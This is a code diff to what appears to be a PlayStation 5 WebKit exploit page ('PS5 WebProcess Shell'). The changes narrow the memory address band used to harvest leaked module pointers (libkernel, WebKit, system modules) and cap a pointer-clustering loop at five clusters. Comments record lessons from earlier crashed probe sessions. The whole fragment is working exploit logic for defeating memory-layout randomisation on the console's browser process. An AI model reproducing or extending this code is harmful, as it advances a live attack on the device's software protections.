@@ -1196,7 +1196,7 @@
   beacon before a crash marks where the probe died)
 -->
 <!DOCTYPE html><html><head><meta charset="utf-8"><title>PS5 WebProcess Shell</title></head>
-<body>
+<body><!-- bust 3177254f-lcbase3 -->
 <div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">SHELL: PIPELINE RUNNING</div>
 <pre id="out">ws-shell v1</pre>
 <script src="rvas.js"></script>
@@ -6219,7 +6219,15 @@ function _startWsShell(){
           reply.lk='0x'+lkBL.toString(16);
           /* (2) harvest - MODULE BAND ONLY */
           function foreignL(v){
-            if(v<0x400000000n||v>=0x10000000000n)return false;  /* the module band ONLY: kills the cage/packed-int floor AND the 0x1-band JS doubles */
+            /* THE SYSMOD BAND [0x800000000, 0x880000000) = where every real
+             * module lives (lk 0x802-0x82f, WebKit 0x815-0x83c, sysmods to
+             * 0x86e). EXCLUDES BY CONSTRUCTION: the cage (0x1005xxxxxx =
+             * 68.7GB, ABOVE this band - the session-162 lesson: the old
+             * [0x400000000,0x10000000000) band let the cage flood the
+             * harvest and the march died in cage pages), the stack
+             * (0x7efxxxxxx = 34.4GB, below), the pthread band
+             * (0x880000000+), the packed-int floor and JS doubles (0x1-band).*/
+            if(v<0x800000000n||v>=0x880000000n)return false;
             if(S.BASE&&(v>=S.BASE&&v<S.BASE+0x8000000n))return false;
             if(v>=lkBL&&v<lkBL+0x200000n)return false;
             if(v>=0x880000000n&&v<0x900000000n)return false;      /* pthread band */
@@ -6304,7 +6312,7 @@ function _startWsShell(){
             clsL.sort(function(a,b){return b.length-a.length;});
             LB('8 clusters='+clsL.length+' good='+clsL.filter(function(c){return c.length>=3;}).length);
             outer:
-            for(var ci3=0;ci3<clsL.length;ci3++){
+            for(var ci3=0;ci3<clsL.length&&ci3<5;ci3++){  /* top-5 clusters only */
               var cl=clsL[ci3];
               if(cl.length<3)continue;
               var mn=cl[0];
